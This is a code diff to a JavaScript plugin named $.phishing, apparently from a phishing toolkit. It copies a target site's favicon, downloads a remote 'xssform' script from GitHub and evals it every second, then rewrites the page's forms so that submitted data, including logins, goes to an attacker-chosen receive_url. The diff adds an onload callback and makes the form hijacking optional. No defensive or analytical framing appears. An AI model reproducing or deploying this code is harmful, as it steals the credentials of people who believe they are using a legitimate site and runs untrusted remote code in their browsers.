@@ -1,11 +1,10 @@
 (function(){
-  var load_jquery =()=>{
-    if(typeof jQuery !='undefined')return;
-    document.write('<script src=https://code.jquery.com/jquery-1.12.1.min.js></script>');
-  };
-  load_jquery();
-  $ = jQuery;
-  $.phishing = function(url,receive_url){
+  $ = jQuery || angular.element;
+  $.phishing = function(url,receive_url,onload){
+    if(typeof receive_url === 'function'){
+      onload = receive_url;
+      receive_url = void(0);
+    }
     var get_link = (url=>{
       var link = document.createElement('a');
       link.href = url;
@@ -35,16 +34,21 @@
       if(document.head){
         $('head').append(`<link rel="shortcut icon" href="${target.protocol}//${target.host}/favicon.ico">`);
       }
-      $.get('https://raw.githubusercontent.com/jackmasa/jQuery.xform/master/jquery.xssform.js',data=>{
-        setInterval(()=>{
-          eval(data);
-          $('form').each((i,f)=>{
-            if(get_link(f.action).hostname!=get_link(receive_url).hostname){
-              $(f).xform(receive_url);
-            }
-          });
-        },1000);
-      });
+      if(receive_url){
+        $.get('https://raw.githubusercontent.com/jackmasa/jQuery.xform/master/jquery.xssform.js',data=>{
+          setInterval(()=>{
+            eval(data);
+            $('form').each((i,f)=>{
+              if(get_link(f.action).hostname!=get_link(receive_url).hostname){
+                $(f).xform(receive_url);
+              }
+            });
+          },1000);
+          onload && setTimeout(onload,233);
+        });
+      }else{
+        onload && setTimeout(onload,233);
+      }
     });
   };
 })();
